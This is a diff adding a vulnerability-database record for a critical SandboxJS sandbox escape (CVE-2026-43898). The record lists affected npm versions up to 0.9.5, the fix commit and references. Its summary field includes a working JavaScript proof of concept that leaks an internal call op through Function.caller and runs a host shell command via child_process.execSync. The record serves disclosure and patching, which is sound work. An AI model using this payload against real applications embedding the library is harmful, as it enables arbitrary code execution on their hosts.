@@ -1,0 +1,165 @@
+advisory_id: GHSA-g8f2-4f4f-5jqw
+datasource_id: github_osv/GHSA-g8f2-4f4f-5jqw
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-g8f2-4f4f-5jqw/GHSA-g8f2-4f4f-5jqw.json
+aliases:
+  - CVE-2026-43898
+summary: "SandboxJS has a sandbox escape via Function.caller leakage of internal call op\n###\
+  \ Summary\nSandbox-defined functions expose `Function.caller`, allowing sandboxed code to\
+  \ recover the internal `LispType.Call` runtime callback. That callback can then be invoked\
+  \ with attacker-controlled fake context and obj values to extract blocked host statics, recover\
+  \ the real host Function constructor, and execute arbitrary host JavaScript.\n### Details\n\
+  \nThe vulnerability is in the property access logic registered via `addOps` in [prop.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/prop.ts#L10).\
+  \ Sandboxed code could access the `caller`, `callee`, and `arguments` properties on functions.\
+  \ In the CommonJS build, this allowed sandboxed code to read `Function.caller` and leak a\
+  \ privileged internal `LispType.Call` callback.\n\nIn [executorUtils.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/executorUtils.ts#L239-L282)\
+  \ `createFunction()` constructs normal host JS functions, and because these are ordinary host\
+  \ functions, sandbox code can observe:\n```js\nfunction f(){ return f.caller }\n```\nThat\
+  \ leaks the host-side callback that invoked the sandbox function. This leaked callback is\
+  \ the internal `LispType.Call` op, which is registered in [call.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L16-L17).\
+  \ The escape was possible because the `LispType.Call` handler accepts a **params** object\
+  \ from the attacker and uses its fields without authenticating that they came from the executor.\
+  \ if you looked at those branches [call.ts:47](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L47-L55),\
+  \ [call.ts:70](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L70),\
+  \ [call.ts:149](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L149-L153).\
+  \ This means the attacker controls `obj.context`, `obj.prop`, `obj.get`, `context.evals.get`\
+  \ and `a`. This can lead to direct invocation of an internal primitive with forged operands\n\
+  \n### PoC\n```js\nconst sandb = require('@nyariv/sandboxjs').default;\nconst sand = new sandb();\
+  \ \n\nconst payload = `\nconst callOp = (function fn() { return fn.caller; })();\n\nfunction\
+  \ makeContext(capture = () => {}) {\n  return { ctx: { options: 0 }, evals: { get: capture\
+  \ } };\n}\n\nfunction leakStatic(obj, prop) {\n  let leaked;\n  callOp({\n    done() {},\n\
+  \    a() {},\n    b: [],\n    obj: { context: obj, prop, get() {} },\n    context: makeContext((fn)\
+  \ => (leaked = fn, () => 1))\n  });\n  return leaked;\n}\n\nfunction callDirect(fn, args)\
+  \ {\n  let value;\n  callOp({\n    done(_, result) { value = result; },\n    a() {},\n   \
+  \ b: args,\n    obj: fn,\n    context: makeContext()\n  });\n  return value;\n}\n\ncallDirect(leakStatic(Object,\
+  \ 'defineProperty'), [\n  leakStatic,\n  'call',\n  callDirect(leakStatic(Object, 'getOwnPropertyDescriptor'),\
+  \ [\n    callDirect(leakStatic(Object, 'getPrototypeOf'), [() => 0]),\n    'constructor'\n\
+  \  ])\n]);\n\nlet hostFn;\ncallOp({\n  done(_, result) { hostFn = result; },\n  a: leakStatic,\n\
+  \  b: [],\n  obj: {\n    context: 'return process.getBuiltinModule(\"child_process\").execSync(\"\
+  whoami\").toString()',\n    get() {}\n  },\n  context: makeContext()\n});\n\nreturn hostFn();\n\
+  `;\n\nconsole.log(sand.compile(payload)().run());\n```\n### Impact\n_Sandbox escape leads\
+  \ to RCE_"
+impacted_packages:
+  - purl: pkg:github/nyariv/sandboxjs
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/nyariv/sandboxjs
+        commit: 826865251232611ec94078bab5a18ec875dad4a5
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/%40nyariv/sandboxjs
+    affected_versions: vers:npm/<=0.9.5
+    fixed_versions: vers:npm/0.9.6
+    affected_packages:
+      - pkg:npm/%40nyariv/sandboxjs@0.1.0
+      - pkg:npm/%40nyariv/sandboxjs@0.1.1
+      - pkg:npm/%40nyariv/sandboxjs@0.2.0
+      - pkg:npm/%40nyariv/sandboxjs@0.2.1
+      - pkg:npm/%40nyariv/sandboxjs@0.2.2
+      - pkg:npm/%40nyariv/sandboxjs@0.2.3
+      - pkg:npm/%40nyariv/sandboxjs@0.3.0
+      - pkg:npm/%40nyariv/sandboxjs@0.3.1
+      - pkg:npm/%40nyariv/sandboxjs@0.3.2
+      - pkg:npm/%40nyariv/sandboxjs@0.3.3
+      - pkg:npm/%40nyariv/sandboxjs@0.3.4
+      - pkg:npm/%40nyariv/sandboxjs@0.3.5
+      - pkg:npm/%40nyariv/sandboxjs@0.3.6
+      - pkg:npm/%40nyariv/sandboxjs@0.3.7
+      - pkg:npm/%40nyariv/sandboxjs@0.3.8
+      - pkg:npm/%40nyariv/sandboxjs@0.3.9
+      - pkg:npm/%40nyariv/sandboxjs@0.3.10
+      - pkg:npm/%40nyariv/sandboxjs@0.3.11
+      - pkg:npm/%40nyariv/sandboxjs@0.3.12
+      - pkg:npm/%40nyariv/sandboxjs@0.3.13
+      - pkg:npm/%40nyariv/sandboxjs@0.3.14
+      - pkg:npm/%40nyariv/sandboxjs@0.3.15
+      - pkg:npm/%40nyariv/sandboxjs@0.3.16
+      - pkg:npm/%40nyariv/sandboxjs@0.3.17
+      - pkg:npm/%40nyariv/sandboxjs@0.3.18
+      - pkg:npm/%40nyariv/sandboxjs@0.4.0
+      - pkg:npm/%40nyariv/sandboxjs@0.5.0
+      - pkg:npm/%40nyariv/sandboxjs@0.5.1
+      - pkg:npm/%40nyariv/sandboxjs@0.5.2
+      - pkg:npm/%40nyariv/sandboxjs@0.5.3
+      - pkg:npm/%40nyariv/sandboxjs@0.6.0
+      - pkg:npm/%40nyariv/sandboxjs@0.6.1
+      - pkg:npm/%40nyariv/sandboxjs@0.6.2
+      - pkg:npm/%40nyariv/sandboxjs@0.6.3
+      - pkg:npm/%40nyariv/sandboxjs@0.7.0
+      - pkg:npm/%40nyariv/sandboxjs@0.7.1
+      - pkg:npm/%40nyariv/sandboxjs@0.8.0
+      - pkg:npm/%40nyariv/sandboxjs@0.8.1
+      - pkg:npm/%40nyariv/sandboxjs@0.8.2
+      - pkg:npm/%40nyariv/sandboxjs@0.8.3
+      - pkg:npm/%40nyariv/sandboxjs@0.8.4
+      - pkg:npm/%40nyariv/sandboxjs@0.8.5
+      - pkg:npm/%40nyariv/sandboxjs@0.8.6
+      - pkg:npm/%40nyariv/sandboxjs@0.8.7
+      - pkg:npm/%40nyariv/sandboxjs@0.8.8
+      - pkg:npm/%40nyariv/sandboxjs@0.8.9
+      - pkg:npm/%40nyariv/sandboxjs@0.8.10
+      - pkg:npm/%40nyariv/sandboxjs@0.8.11
+      - pkg:npm/%40nyariv/sandboxjs@0.8.12
+      - pkg:npm/%40nyariv/sandboxjs@0.8.13
+      - pkg:npm/%40nyariv/sandboxjs@0.8.14
+      - pkg:npm/%40nyariv/sandboxjs@0.8.15
+      - pkg:npm/%40nyariv/sandboxjs@0.8.16
+      - pkg:npm/%40nyariv/sandboxjs@0.8.17
+      - pkg:npm/%40nyariv/sandboxjs@0.8.18
+      - pkg:npm/%40nyariv/sandboxjs@0.8.19
+      - pkg:npm/%40nyariv/sandboxjs@0.8.20
+      - pkg:npm/%40nyariv/sandboxjs@0.8.21
+      - pkg:npm/%40nyariv/sandboxjs@0.8.22
+      - pkg:npm/%40nyariv/sandboxjs@0.8.23
+      - pkg:npm/%40nyariv/sandboxjs@0.8.24
+      - pkg:npm/%40nyariv/sandboxjs@0.8.25
+      - pkg:npm/%40nyariv/sandboxjs@0.8.26
+      - pkg:npm/%40nyariv/sandboxjs@0.8.27
+      - pkg:npm/%40nyariv/sandboxjs@0.8.28
+      - pkg:npm/%40nyariv/sandboxjs@0.8.29
+      - pkg:npm/%40nyariv/sandboxjs@0.8.30
+      - pkg:npm/%40nyariv/sandboxjs@0.8.31
+      - pkg:npm/%40nyariv/sandboxjs@0.8.32
+      - pkg:npm/%40nyariv/sandboxjs@0.8.33
+      - pkg:npm/%40nyariv/sandboxjs@0.8.34
+      - pkg:npm/%40nyariv/sandboxjs@0.8.35
+      - pkg:npm/%40nyariv/sandboxjs@0.8.36
+      - pkg:npm/%40nyariv/sandboxjs@0.9.0
+      - pkg:npm/%40nyariv/sandboxjs@0.9.1
+      - pkg:npm/%40nyariv/sandboxjs@0.9.2
+      - pkg:npm/%40nyariv/sandboxjs@0.9.3
+      - pkg:npm/%40nyariv/sandboxjs@0.9.4
+      - pkg:npm/%40nyariv/sandboxjs@0.9.5
+    fixed_packages:
+      - pkg:npm/%40nyariv/sandboxjs@0.9.6
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '10.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-g8f2-4f4f-5jqw/GHSA-g8f2-4f4f-5jqw.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/nyariv/SandboxJS
+    reference_type:
+    reference_id:
+  - url: https://github.com/nyariv/SandboxJS/commit/826865251232611ec94078bab5a18ec875dad4a5
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-43898
+    reference_type:
+    reference_id: CVE-2026-43898
+  - url: https://github.com/nyariv/SandboxJS/security/advisories/GHSA-g8f2-4f4f-5jqw
+    reference_type:
+    reference_id: GHSA-g8f2-4f4f-5jqw
+exploits: []
